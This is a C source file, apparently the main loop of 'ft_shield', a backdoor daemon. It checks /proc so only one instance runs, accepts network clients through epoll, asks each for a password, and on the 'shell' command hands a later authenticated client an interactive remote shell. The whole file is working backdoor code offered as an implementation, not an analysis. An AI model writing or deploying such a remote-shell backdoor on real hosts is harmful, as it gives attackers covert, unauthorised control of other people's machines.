#include "ft_shield.h"

int nb_clients = 0;
#define NAME "ft_shield"

char *clean_join(char *s1, char *s2) {
	char *tmp = ft_strjoin(s1, s2);
	free(s1);
	return tmp;
}

bool pgrep(char *name) {
	DIR *proc = opendir("/proc");
	struct dirent *entry;
	int pid = getpid();

	if (!proc)
		return false;
	
	while ((entry = readdir(proc))) {
		if (entry->d_type == DT_DIR && strspn(entry->d_name, "0123456789") == ft_strlen(entry->d_name)) {
			char path[256] = {};
			snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);

			int fd = open(path, O_RDONLY);
			if (fd > 0) {
				char comm[256] = {};
				if (read(fd, comm, 255) > 0 && !ft_strcmp(comm, name)
					&& atoi(entry->d_name) != pid) {
					close(fd);
					return true;
				}
				close(fd);
			}
		}
	}

	closedir(proc);
	return false;
}

int main() {
	if (pgrep(NAME"\n")) {
		DEBUG("There's already an instance\n");
		return false;
	}


	struct sockaddr_in addr = {};
	struct epoll_event ev, events[MAX_CLIENTS];
	Client clients[MAX_CLIENTS] = {};
	
	int pipefd[2];
	if (pipe(pipefd)) {
		DEBUG("pipe does not work");
		return 0;
	}

	bool shell = false;

	init_clients(clients);
	int sock = init_socket(&addr);
	if (!sock)
		return 0;

	int epollfd = epoll_create1(0);
	if (epollfd < 0) {
		DEBUG("epoll_create1 does not work");
		return 0;
	}

	ev.events = EPOLLIN;
	ev.data.fd = sock;
	if (epoll_ctl(epollfd, EPOLL_CTL_ADD, sock, &ev)) {
		DEBUG("epoll_ctl does not work");
		return 0;
	}

	ev.events = EPOLLIN;
	ev.data.fd = pipefd[0];
	if (epoll_ctl(epollfd, EPOLL_CTL_ADD, pipefd[0], &ev)) {
		DEBUG("epoll_ctl does not work");
		return 0;
	}

	while (true) {
		int nfds = epoll_wait(epollfd, events, 256, -1);
		if (nfds == -1) {
			continue;
		}

		for (int n = 0; n < nfds; n++) {
			int fd = events[n].data.fd;
			if (fd == sock) {
				if (nb_clients >= MAX_CLIENTS) {
					refuse_client(sock, epollfd, &addr, &ev);
					continue;
				}
				int newfd = new_connection(sock, epollfd, &addr, &ev);
				add_client(clients, newfd);
				nb_clients++;
				PUTSTR(newfd, "Password: ");
			} else if (fd == pipefd[0]) {
				disconnect_shell(fd, clients, epollfd, &ev);
			} else {
				Client *client = get_client(clients, events[n].data.fd);
				if (!client) {
					continue;
				}

				char *line = readline(client->fd);
				if (!line) {
					disconnect_client(client, epollfd, &ev);
					continue;
				}

				if (!client->logged) {
					check_password(client, line);
					if (client->logged && shell) {
						shell = false;
						sh(client, pipefd[1]);
						free(line);
						continue;
					}
				} else if (!ft_strcmp(line, "shell\n")) {
					shell = true;
					disconnect_client(client, epollfd, &ev);
				} else if (!ft_strcmp(line, "?\n")) {
					PUTSTR(client->fd, HELP);
				}

				free(line);
			}
		}
	}

	close(pipefd[0]);
	close(pipefd[1]);
	close(sock);
}
